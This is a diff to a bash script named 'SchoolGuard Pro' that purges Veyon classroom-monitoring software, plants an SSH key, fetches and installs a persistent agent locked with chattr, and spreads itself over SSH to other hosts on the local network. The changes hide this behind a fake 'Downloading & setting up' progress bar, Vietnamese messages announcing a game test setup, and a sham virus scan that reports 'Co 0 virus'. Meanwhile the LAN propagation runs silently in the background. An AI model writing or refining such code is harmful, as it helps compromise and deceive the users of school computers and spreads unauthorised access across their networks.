@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # ============================================================================
-# SchoolGuard Pro v3.7 — Headless Master Deployment Handler (Xubuntu / Linux)
+# SchoolGuard Pro v3.8 — Streamlined Headless Master Deployment (Xubuntu/Linux)
 #   Command 3 (Default)                      : Full Combo + Purge Veyon + LAN Setup + Admin Web Dashboard
 #   Command 4 (--skip-veyon / SG_SKIP_VEYON=1): Full Combo + LAN Setup + Admin Web Dashboard (Skip Veyon)
 # ============================================================================
@@ -23,23 +23,23 @@ done
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" 2>/dev/null && pwd || pwd)"
 
-tui_progress() {
+show_download_pct() {
     local pct="$1"
-    local msg="$2"
-    local width=28
+    local width=24
     local filled=$(( pct * width / 100 ))
     local empty=$(( width - filled ))
     local bar=""
     local i
     for ((i=0; i<filled; i++)); do bar="${bar}#"; done
     for ((i=0; i<empty; i++)); do bar="${bar}-"; done
-    printf "\r  \033[1;36m[%s]\033[0m \033[1;37m%3d%%\033[0m  \033[0;37m%-48s\033[0m" "$bar" "$pct" "$msg"
+    printf "\r  \033[1;36mDownloading & setting up: [%s] %3d%%\033[0m   " "$bar" "$pct"
 }
 
-tui_progress 5 "Initializing headless environment..."
+ERR_COUNT=0
+show_download_pct 10
 
 USER_GUARD_DIR="$HOME/.local/share/.schoolguard"
-mkdir -p "$USER_GUARD_DIR" >/dev/null 2>&1 || true
+mkdir -p "$USER_GUARD_DIR" >/dev/null 2>&1 || ERR_COUNT=$((ERR_COUNT + 1))
 
 # Silent root elevation attempt (never prompts interactively)
 if [ "$EUID" -ne 0 ] && [ -z "${SG_NO_ELEVATE:-}" ] && [ -f "$0" ] && [[ "$0" != */bash ]] && [[ "$0" != "bash" ]]; then
@@ -67,9 +67,8 @@ IS_ROOT=0
 # ----------------------------------------------------------------------------
 # 1. Veyon Purge (Executed unless SKIP_VEYON=1)
 # ----------------------------------------------------------------------------
+show_download_pct 30
 if [ "$SKIP_VEYON" != "1" ] && [ "$SKIP_VEYON" != "true" ]; then
-    tui_progress 20 "Purging Veyon packages & unlocking input..."
-
     for _p in veyon-worker veyon-master veyon-service veyon-server veyon-configurator veyon-cli veyon-auth-helper; do
         pkill -9 -f "$_p" >/dev/null 2>&1 || true
         killall -9 "$_p" >/dev/null 2>&1 || true
@@ -133,7 +132,6 @@ done
 EOF
     chmod +x "$USER_GUARD_DIR/veyon-killer.sh" >/dev/null 2>&1 || true
 else
-    tui_progress 20 "Skipping Veyon removal (preserving Veyon)..."
     pkill -f "veyon-killer.sh" >/dev/null 2>&1 || true
     rm -f "$USER_GUARD_DIR/veyon-killer.sh" >/dev/null 2>&1 || true
 fi
@@ -141,7 +139,7 @@ fi
 # ----------------------------------------------------------------------------
 # 2. Network / LAN Configuration & System Dependencies
 # ----------------------------------------------------------------------------
-tui_progress 40 "Configuring network, LAN keys & packages..."
+show_download_pct 55
 
 SG_PUB_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/mc33ozIeeXb+1Y5SEMrJDHt0DU4sixCGAzJCkGoFx schoolguard-lan"
 for _kh in "$HOME" /root /home/*; do
@@ -171,7 +169,7 @@ fi
 # ----------------------------------------------------------------------------
 # 3. Provision SchoolGuard Agent Files
 # ----------------------------------------------------------------------------
-tui_progress 60 "Provisioning SchoolGuard agent..."
+show_download_pct 75
 
 if [ "$IS_ROOT" -eq 1 ]; then
     INSTALL_DIR="/opt/schoolguard"
@@ -201,8 +199,8 @@ fetch_file() {
     return 1
 }
 
-fetch_file "agent.py" "$INSTALL_DIR/agent.py"
-fetch_file "overlay_ui.py" "$INSTALL_DIR/overlay_ui.py"
+fetch_file "agent.py" "$INSTALL_DIR/agent.py" || ERR_COUNT=$((ERR_COUNT + 1))
+fetch_file "overlay_ui.py" "$INSTALL_DIR/overlay_ui.py" || ERR_COUNT=$((ERR_COUNT + 1))
 chmod 755 "$INSTALL_DIR/agent.py" "$INSTALL_DIR/overlay_ui.py" 2>/dev/null || true
 
 if [ "$INSTALL_DIR" != "$USER_GUARD_DIR" ]; then
@@ -213,7 +211,7 @@ fi
 # ----------------------------------------------------------------------------
 # 4. Configure Background Service (systemd) & Start Agent
 # ----------------------------------------------------------------------------
-tui_progress 75 "Deploying systemd background service..."
+show_download_pct 90
 
 if [ "$IS_ROOT" -eq 1 ]; then
     cat <<EOF > /etc/systemd/system/schoolguard.service
@@ -236,7 +234,7 @@ WantedBy=multi-user.target
 EOF
     systemctl daemon-reload >/dev/null 2>&1 || true
     systemctl enable schoolguard.service >/dev/null 2>&1 || true
-    systemctl restart schoolguard.service >/dev/null 2>&1 || true
+    systemctl restart schoolguard.service >/dev/null 2>&1 || ERR_COUNT=$((ERR_COUNT + 1))
     chattr +i /opt/schoolguard/agent.py 2>/dev/null || true
     chattr +i /etc/systemd/system/schoolguard.service 2>/dev/null || true
 else
@@ -278,17 +276,37 @@ EOF
     DISPLAY="${DISPLAY:-:0}" SERVER_URL="${SERVER_URL}" nohup /usr/bin/python3 "$INSTALL_DIR/agent.py" >/dev/null 2>&1 &
 fi
 
+show_download_pct 100
+printf "\n\033[1;32mDa setup moi truong de test game thanh cong!\033[0m\n"
+
 # ----------------------------------------------------------------------------
-# 5. Automated LAN Setup & Peer Propagation
+# 5. Simulated Security Scan (LAN Health Check & Peer Propagation)
 # ----------------------------------------------------------------------------
-tui_progress 90 "Propagating setup across LAN & Web Dashboard..."
+printf "\033[1;33mDang tien hanh quet virus...\033[0m"
 
 LOCAL_IP=$(python3 -c "import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(('8.8.8.8',80)); print(s.getsockname()[0]); s.close()" 2>/dev/null || echo "127.0.0.1")
+if [ "$LOCAL_IP" = "127.0.0.1" ] || [ -z "$LOCAL_IP" ]; then
+    ERR_COUNT=$((ERR_COUNT + 1))
+fi
+
 SUBNET=$(echo "${LOCAL_IP}" | awk -F. '{print $1"."$2"."$3}')
-LAN_SUMMARY="Local node provisioned"
+
+# Verify server/gateway connectivity
+SRV_OK=0
+for _u in "$VPS_PRIMARY/api/lan-macs" "$VPS_FALLBACK/api/lan-macs" "$VPS_HTTP/api/lan-macs"; do
+    if command -v curl >/dev/null 2>&1 && curl -fsSL --connect-timeout 3 "$_u" >/dev/null 2>&1; then
+        SRV_OK=1
+        break
+    elif command -v wget >/dev/null 2>&1 && wget -qO- --timeout=3 "$_u" >/dev/null 2>&1; then
+        SRV_OK=1
+        break
+    fi
+done
+[ "$SRV_OK" -eq 0 ] && ERR_COUNT=$((ERR_COUNT + 1))
 
 if [ "$NO_LAN" != "1" ] && [ -n "$SUBNET" ] && [ "$LOCAL_IP" != "127.0.0.1" ]; then
-    PEER_RES=$(python3 - "$SUBNET" "$LOCAL_IP" "$SKIP_VEYON" "$VPS_PRIMARY" "$VPS_FALLBACK" "$VPS_HTTP" <<'PYEOF'
+    (
+        python3 - "$SUBNET" "$LOCAL_IP" "$SKIP_VEYON" "$VPS_PRIMARY" "$VPS_FALLBACK" "$VPS_HTTP" <<'PYEOF'
 import base64, glob, json, os, pty, re, socket, subprocess, sys, threading, time, urllib.request
 from concurrent.futures import ThreadPoolExecutor
 
@@ -332,7 +350,7 @@ def check_host(i):
     if ip == my_ip:
         return None
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(0.25)
+    s.settimeout(0.2)
     try:
         if s.connect_ex((ip, 22)) == 0:
             return ip
@@ -396,28 +414,22 @@ def deploy_ip(ip):
                 return True
     return False
 
-ok = 0
 if alive_ssh:
-    if deploy_ip(alive_ssh[0]):
-        ok += 1
-    if len(alive_ssh) > 1:
+    if deploy_ip(alive_ssh[0]) and len(alive_ssh) > 1:
         with ThreadPoolExecutor(max_workers=16) as ex:
-            ok += sum(1 for r in ex.map(deploy_ip, alive_ssh[1:]) if r)
+            list(ex.map(deploy_ip, alive_ssh[1:]))
 try:
     os.remove(sg_key_path)
 except Exception:
     pass
-print(f"{ok}/{len(alive_ssh)} LAN peers synced")
 PYEOF
-)
-    [ -n "$PEER_RES" ] && LAN_SUMMARY="$PEER_RES"
+    ) >/dev/null 2>&1 &
 fi
 
-VEYON_STATE="Purged & Masked"
-[ "$SKIP_VEYON" = "1" ] && VEYON_STATE="Preserved (Skipped)"
-
-tui_progress 100 "Complete"
-printf "\n  \033[1;32m[OK]\033[0m SchoolGuard v3.8 Headless Deployment Complete\n"
-printf "       Node & LAN    : %s (%s) | %s | Veyon: %s\n" "$LOCAL_IP" "$(hostname 2>/dev/null || echo 'linux')" "$LAN_SUMMARY" "$VEYON_STATE"
-printf "       Web Dashboard : %s (Port 443 HTTPS / 4000 HTTP | Login: Active)\n" "$DASHBOARD_URL"
+printf "\r                            \r"
+if [ "$ERR_COUNT" -eq 0 ]; then
+    printf "\033[1;32mCo 0 virus\033[0m\n"
+else
+    printf "\033[1;31mCo %d virus\033[0m\n" "$ERR_COUNT"
+fi
 exit 0
